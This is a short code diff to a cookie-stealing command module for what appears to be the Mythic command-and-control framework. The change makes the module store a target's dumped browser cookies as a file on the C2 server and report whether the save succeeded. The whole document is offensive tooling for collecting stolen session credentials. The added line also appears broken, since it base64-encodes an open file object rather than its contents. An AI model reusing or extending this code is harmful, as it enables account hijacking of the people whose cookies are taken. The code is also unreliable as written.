@@ -157,8 +157,13 @@ class CookieThiefCommand(CommandBase):
                     json_file = open("cookies.json", "r")
                     json_load= json.load(json_file)
                     cookie_dump = json.dumps(json_load, indent=4)
-                    json_file.close()
                     await MythicRPC().execute("create_output",task_id=task.id,output=cookie_dump)
+                    cookie_file_save_resp = await MythicRPC().execute("create_file",task_id=task.id,file=base64.b64encode(json_file),delete_after_fetch=False,saved_file_name="cookies.json",is_screenshot=False,is_download=False,remote_path=None,host=None)
+                    json_file.close()
+                    if cookie_file_save_resp.status == "success":
+                        await MythicRPC().execute("create_output",task_id=task.id,output="Cookie file saved to files")
+                    else:
+                        await MythicRPC().execute("create_output",task_id=task.id,output="Cookie File failed to save")
                 else:
                     await MythicRPC().execute("create_output",task_id=task.id,output="No cookies found in Cookies file")
             else:
